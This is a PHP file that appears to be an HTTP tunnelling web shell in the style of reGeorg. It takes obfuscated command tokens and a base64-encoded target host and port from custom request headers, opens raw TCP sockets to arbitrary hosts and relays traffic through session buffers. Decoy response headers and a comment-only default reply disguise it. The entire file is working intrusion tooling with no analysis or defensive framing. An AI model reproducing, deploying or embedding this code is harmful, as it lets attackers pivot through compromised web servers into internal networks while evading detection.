<?php
ini_set("allow_url_fopen", true);
ini_set("allow_url_include", true);
error_reporting(E_ERROR | E_PARSE);

if(version_compare(PHP_VERSION,'5.4.0','>='))@http_response_code(200);

if( !function_exists('apache_request_headers') ) {
    function apache_request_headers() {
        $arh = array();
        $rx_http = '/\AHTTP_/';

        foreach($_SERVER as $key => $val) {
            if( preg_match($rx_http, $key) ) {
                $arh_key = preg_replace($rx_http, '', $key);
                $rx_matches = array();
                $rx_matches = explode('_', $arh_key);
                if( count($rx_matches) > 0 and strlen($arh_key) > 2 ) {
                    foreach($rx_matches as $ak_key => $ak_val) {
                        $rx_matches[$ak_key] = ucfirst($ak_val);
                    }

                    $arh_key = implode('-', $rx_matches);
                }
                $arh[ucwords(strtolower($arh_key))] = $val;
            }
        }
        return($arh);
    }
}

set_time_limit(0);
$headers=apache_request_headers();
$en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
$de = "D46ojQ1FVWiqhyegd9nXGHrazEAbYlfsKuTSJmcB3PMtN+/C5O8kLwI7vRZp02Ux";

$cmd = $headers["Iwht"];
$mark = substr($cmd,0,22);
$cmd = substr($cmd, 22);
$run = "run".$mark;
$writebuf = "writebuf".$mark;
$readbuf = "readbuf".$mark;

switch($cmd){
    case "JP76HNpuuCxjWtU4HkPj_CIyVc1QCDkKlRQe2f_yJ88hQbUnP2ZBXcWo":
        {
            $target_ary = explode("|", base64_decode(strtr($headers["Hiyuktxzzmjd"], $de, $en)));
            $target = $target_ary[0];
            $port = (int)$target_ary[1];
            $res = fsockopen($target, $port, $errno, $errstr, 1);
            if ($res === false)
            {
                header('Bqdymx: cVKvsF');
                header('Dml: arHXnPuJUf4eJ68g2kMSpPTgGsbCcKCTI3432va0HAtvJu6TrAaJrJ7');
                return;
            }

            stream_set_blocking($res, false);
            ignore_user_abort();

            @session_start();
            $_SESSION[$run] = true;
            $_SESSION[$writebuf] = "";
            $_SESSION[$readbuf] = "";
            session_write_close();

            while ($_SESSION[$run])
            {
                if (empty($_SESSION[$writebuf])) {
                    usleep(50000);
                }

                $readBuff = "";
                @session_start();
                $writeBuff = $_SESSION[$writebuf];
                $_SESSION[$writebuf] = "";
                session_write_close();
                if ($writeBuff != "")
                {
                    stream_set_blocking($res, false);
                    $i = fwrite($res, $writeBuff);
                    if($i === false)
                    {
                        @session_start();
                        $_SESSION[$run] = false;
                        session_write_close();
                        return;
                    }
                }
                stream_set_blocking($res, false);
                while ($o = fgets($res, 10)) {
                    if($o === false)
                    {
                        @session_start();
                        $_SESSION[$run] = false;
                        session_write_close();
                        return;
                    }
                    $readBuff .= $o;
                }
                if ($readBuff != ""){
                    @session_start();
                    $_SESSION[$readbuf] .= $readBuff;
                    session_write_close();
                }
            }
            fclose($res);
        }
        @header_remove('set-cookie');
        break;
    case "mzkmJ8BGwRXiknxBYwROGlVL":
        {
            @session_start();
            unset($_SESSION[$run]);
            unset($_SESSION[$readbuf]);
            unset($_SESSION[$writebuf]);
            session_write_close();
        }
        break;
    case "aqAFU2WR1HUhAL6oUTovKzFBDeauBln_DyqXVXJx6":
        {
            @session_start();
            $readBuffer = $_SESSION[$readbuf];
            $_SESSION[$readbuf]="";
            $running = $_SESSION[$run];
            session_write_close();
            if ($running) {
                header('Bqdymx: GDlclevxUGXnJtE0gQoT6nyDGfTSkcumhAhdnPNxDT2ITDBvTGJIzm_');
                header("Connection: Keep-Alive");
                echo strtr(base64_encode($readBuffer), $en, $de);
            } else {
                header('Bqdymx: cVKvsF');
            }
        }
        break;
    case "jwKZZH2QVlF9KDKWaDmw6bSqIHruHBkAx44CDRqmm1e5abzZ83XzQoyyB_FPWxBAD": {
            @session_start();
            $running = $_SESSION[$run];
            session_write_close();
            if(!$running){
                header('Bqdymx: cVKvsF');
                header('Dml: 0dLqRo03lfFMshy4Gqh9RUgWN8XWkEIDBadfl7IXBn4hXUdiGrtQVdY9Y');
                return;
            }
            header('Content-Type: application/octet-stream');
            $rawPostData = file_get_contents("php://input");
            if ($rawPostData) {
                @session_start();
                $_SESSION[$writebuf] .= base64_decode(strtr($rawPostData, $de, $en));
                session_write_close();
                header('Bqdymx: GDlclevxUGXnJtE0gQoT6nyDGfTSkcumhAhdnPNxDT2ITDBvTGJIzm_');
                header("Connection: Keep-Alive");
            } else {
                header('Bqdymx: cVKvsF');
                header('Dml: v9Np6EHz9_sKAoGVZyGUHPzIR32wReBl4MHD1SuqBRdPuYPwCh');
            }
        }
        break;
    default: {
        @session_start();
        session_write_close();
        exit("<!-- HAFBOl0Bv6ktmgh4PvKFdBwV03cOsSt7mwOmv8LFUz2SCESX3KOpkAEVChumS -->");
    }
}
